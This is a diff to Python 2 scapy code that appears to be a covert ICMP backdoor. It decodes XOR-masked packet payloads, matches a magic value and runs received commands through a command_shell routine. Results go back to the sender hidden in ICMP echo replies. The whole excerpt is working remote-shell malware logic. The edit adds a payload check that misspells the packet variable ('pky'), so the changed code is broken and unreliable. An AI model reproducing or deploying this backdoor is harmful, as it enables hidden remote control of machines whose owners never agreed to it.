@@ -32,17 +32,18 @@ shell = "\xca\xcb\xcc\xcd"
 source = ""
 
 def action(pkt):
-	buff = XOR(pkt.load)
+	if pky.load:
+		buff = XOR(pkt.load)
 
-	if buff[0:4] == client_magic:
-		source = pkt.src
-		if buff[4:8] == ping:
-			print "Ping"
-		elif buff[4:8] == port:
-			print "Port"
-		elif buff[4:8] == shell:
-			time.sleep(0.5)
-			command_shell(buff[8:])
+		if buff[0:4] == client_magic:
+			source = pkt.src
+			if buff[4:8] == ping:
+				print "Ping"
+			elif buff[4:8] == port:
+				print "Port"
+			elif buff[4:8] == shell:
+				time.sleep(0.5)
+				command_shell(buff[8:])
 
 def packet_builder(data):
 	packet = Ether() / IP(dst=source) / ICMP(type=0) / (XOR(server_magic + data))
